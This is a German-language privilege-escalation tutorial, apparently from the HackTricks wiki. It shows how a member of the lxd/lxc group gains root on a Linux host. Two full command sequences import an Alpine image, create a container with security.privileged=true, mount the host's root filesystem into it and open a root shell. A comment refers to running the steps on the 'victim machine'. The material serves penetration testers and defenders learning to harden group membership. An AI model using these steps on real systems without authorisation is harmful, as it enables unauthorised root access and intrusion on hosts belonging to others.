# lxd/lxc Gruppe - Privilegieneskalation

{{#include ../../../banners/hacktricks-training.md}}

Wenn Sie zur _**lxd**_ **oder** _**lxc**_ **Gruppe** gehören, können Sie root werden.

## Ausnutzen ohne Internet

### Methode 1

Sie können ein Alpine-Image von einem vertrauenswürdigen Repository herunterladen, um es mit lxd zu verwenden. Canonical veröffentlicht tägliche Builds auf ihrer Seite: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/) 
Laden Sie einfach sowohl **lxd.tar.xz** als auch **rootfs.squashfs** aus dem neuesten Build herunter. (Der Verzeichnisname ist das Datum).

Alternativ können Sie diesen Distro-Builder auf Ihrem Rechner installieren: [https://github.com/lxc/distrobuilder](https://github.com/lxc/distrobuilder) (folgen Sie den Anweisungen auf GitHub):
```bash
# Install requirements
sudo apt update
sudo apt install -y golang-go gcc debootstrap rsync gpg squashfs-tools git make build-essential libwin-hivex-perl wimtools genisoimage

# Clone repo
mkdir -p $HOME/go/src/github.com/lxc/
cd $HOME/go/src/github.com/lxc/
git clone https://github.com/lxc/distrobuilder

# Make distrobuilder
cd ./distrobuilder
make

# Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Create the container - Beware of architecture while compiling locally.
sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
```
Laden Sie die Dateien **incus.tar.xz** (**lxd.tar.xz**, wenn Sie sie aus dem Canonical-Repository heruntergeladen haben) und **rootfs.squashfs** hoch, fügen Sie das Image zum Repository hinzu und erstellen Sie einen Container:
```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
> [!CAUTION]
> Wenn Sie diesen Fehler _**Fehler: Kein Speicherpool gefunden. Bitte erstellen Sie einen neuen Speicherpool**_\
> Führen Sie **`lxd init`** aus und richten Sie alle Optionen auf die Standardeinstellungen ein. Dann **wiederholen** Sie den vorherigen Befehlssatz

Schließlich können Sie den Container ausführen und root erhalten:
```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
### Methode 2

Erstellen Sie ein Alpine-Image und starten Sie es mit dem Flag `security.privileged=true`, wodurch der Container gezwungen wird, als Root mit dem Host-Dateisystem zu interagieren.
```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```
{{#include ../../../banners/hacktricks-training.md}}
